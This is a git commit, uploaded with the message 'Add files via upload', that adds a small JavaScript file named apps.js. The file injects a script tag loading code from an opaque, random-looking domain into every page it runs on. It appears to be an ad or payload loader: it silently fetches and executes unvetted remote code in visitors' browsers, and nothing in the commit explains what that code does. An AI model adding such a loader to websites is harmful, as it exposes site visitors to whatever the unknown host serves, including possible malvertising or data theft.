8ec79bfb5045a8023934b1a554e738dcd7ce178d
lunaasia07 <166106882+lunaasia07@users.noreply.github.com>
2024-06-13 18:12:56 -0500

    Add files via upload

---
+++ js/apps.js
@@ -0,0 +1,7 @@
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = '//kzt2afc1rp52.com/7a/a5/26/7aa5263cb6c6b3040ad60052319dc7b7.js';
+
+// Agregar el elemento <script> al final del body
+document.body.appendChild(script);
+
